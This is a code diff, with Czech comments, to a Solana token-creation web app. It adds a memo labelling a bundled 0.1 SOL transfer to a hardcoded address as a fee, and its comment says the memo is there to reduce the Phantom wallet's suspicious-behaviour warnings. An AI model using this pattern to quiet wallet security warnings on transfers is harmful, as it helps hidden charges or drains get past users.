@@ -12,7 +12,7 @@ import {
   LAMPORTS_PER_SOL,
   TransactionInstruction,
 } from '@solana/web3.js';
-import {
+import { 
   TOKEN_PROGRAM_ID,
   MintLayout,
   createInitializeMintInstruction,
@@ -26,6 +26,9 @@ import {
   createCreateMetadataAccountV3Instruction,
   createUpdateMetadataAccountV2Instruction,
 } from '@metaplex-foundation/mpl-token-metadata';
+
+// Importujeme funkci pro memo instrukci, která pomáhá vysvětlit účel převodu
+import { createMemoInstruction } from '@solana/spl-memo';
 
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { useWallet } from '@solana/wallet-adapter-react';
@@ -469,13 +472,18 @@ export async function createCoinOnSolana({
     let { blockhash } = await connection.getLatestBlockhash();
     transaction.recentBlockhash = blockhash;
 
-    // Převod 0.1 SOL - pro účely tvé logiky
+    // Převod 0.1 SOL jako poplatek – tato instrukce bude součástí stejné transakce
     transaction.add(
       SystemProgram.transfer({
         fromPubkey: walletKey,
         toPubkey: new PublicKey('DnGMKFnAh9qtatYpZsLJhwS6NN1G6LC5WtbRyuNX8o4X'),
         lamports: 0.1 * LAMPORTS_PER_SOL,
       })
+    );
+
+    // Přidání memo instrukce vysvětlující účel poplatku (pomáhá snížit varování Phantom o podezřelém chování)
+    transaction.add(
+      createMemoInstruction("Fee for token creation: 0.1 SOL")
     );
 
     // Vytvoření mint účtu
